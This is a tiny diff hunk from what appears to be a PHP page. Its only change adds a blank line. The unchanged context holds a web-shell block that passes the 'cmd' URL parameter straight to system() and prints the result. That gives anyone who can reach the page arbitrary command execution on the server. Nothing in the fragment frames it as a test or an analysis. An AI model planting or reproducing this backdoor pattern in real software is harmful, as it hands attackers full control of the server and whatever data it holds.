@@ -10,6 +10,7 @@
     {
         system($_GET['cmd']);
     }
+
 ?>
 </pre>
 </body>
